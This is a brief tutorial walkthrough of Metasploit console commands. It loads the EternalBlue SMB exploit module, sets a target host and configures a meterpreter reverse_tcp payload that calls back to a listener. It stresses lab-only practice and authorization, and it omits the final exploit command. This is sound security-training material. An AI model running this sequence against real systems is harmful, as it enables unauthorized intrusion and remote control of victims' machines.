Code Walkthrough

Typical command sequence

Practice these commands in a lab. Do not run 'exploit' unless you have written authorization.

# Start Metasploit
msfconsole

# Search for a candidate exploit
search eternalblue

# Select an exploit module
use exploit/windows/smb/ms17_010_eternalblue

# Show options for the selected module
show options

# Set the target host
set RHOSTS 192.168.1.101

# Show possible payloads
show payloads

# Select a payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Configure listener options
set LHOST 192.168.1.5
set LPORT 4444

# Do NOT run 'exploit' in this exercise
Explanation
  • Search finds modules indexed by keyword.
  • Use loads a module into the session for inspection.
  • Show options lists required settings you must configure before attempting any action.
Practical advice
Always double-check target IPs and network configurations. Use 'check' where supported to validate vulnerability status without executing the exploit. When configuring listeners, ensure network reachability exists between the target and your listener in a lab environment.
Common mistake
Setting LHOST to an unreachable address or forgetting to scope tests to lab targets, which prevents valid results and may impact production.
Key Takeaway

The console workflow is predictable: identify modules, inspect options, set targets and payloads, validate, then only exploit with clear authorization.
